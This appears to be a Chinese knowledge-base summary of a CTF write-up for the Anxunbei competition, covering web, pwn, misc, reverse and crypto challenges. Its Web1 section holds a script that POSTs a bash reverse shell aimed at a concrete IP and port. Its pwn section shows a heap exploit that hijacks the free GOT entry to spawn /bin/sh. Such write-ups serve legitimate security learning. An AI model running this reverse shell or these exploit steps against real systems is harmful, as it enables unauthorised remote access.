---
title: "安洵杯 部分 WP"
category: ctf
tags: [ctf, 安洵杯, writeup, web, pwn, misc, reverse, crypto]
triggers: [安洵杯, anxunbei]
created: 2026-06-09
updated: 2026-06-09
sources: [raw/安洵杯部分WP-安全KER - 安全资讯平台.md]
---

# 安洵杯 部分 WP

> 来源：[安全KER](https://www.anquanke.com/post/id/223786) | 作者：Retr_0

| 赛道 | 题目 | 核心考点 |
|------|------|---------|
| Web | web1 | Bash 限制绕过 — `${0}<<<${0}\<\<\<...` 构造任意 shellcode |
| Misc | 签到 | 公众号回复 flag |
| Misc | 王牌特工 | VeraCrypt 挂载 + flagbox 取证 |
| Misc | Misc3 | CRC32 爆破伪加密密码 + ZIP 明文攻击 |
| Misc | Misc4 | 零宽度字符隐写 + SilentEye 图片隐写 |
| Pwn | Einstein | main_arena + libc 泄露 → one_gadget 打 exit |
| Pwn | IO_FILE | 堆利用 + `free` GOT 劫持为 `puts` → libc 泄露 → one_gadget |
| Pwn | web-server | 目录穿越 |
| Re | Re1 | SMC 自修改代码 + 魔改 Base64 |
| Crypto | cry1 | SHA256 碰撞 6 字符未知 |
| Crypto | cry2 | AES-CBC Key 恢复 via hint 异或 |
| Crypto | cry3 | Chal1 平方开方 + Chal2 三素数分解 + Chal3 Coppersmith 高位已知 |

## Web1 — Bash 限制绕过

```python
# 逐字符编码为 octal → `${0}<<<${0}\<\<\<...` 
# 构造 bash -i >& /dev/tcp/IP/PORT 0>&1
payload = build_payload("bash -i >& /dev/tcp/81.70.154.76/2333 0>&1")
requests.post(url, data={"cmd": payload})
```

## Pwn — IO_FILE

```python
# Fastbin overlap → free GOT 写为 puts → 泄露 libc
# 再次劫持 free GOT 为 one_gadget
free(3)
add(0x68, p64(free_got))
add(0x68, '/bin/sh\x00')
add(0x68, p64(one))
free(8)  # → system("/bin/sh")
```

## Connections
- Related: [[misc/skill-bashjails]], [[misc/png-idat-dp-repair]], [[misc/behinder-traffic-decryption]], [[crypto/hastad-coppersmith-linear-padding]]
- Source: [[raw/安洵杯部分WP-安全KER - 安全资讯平台]]
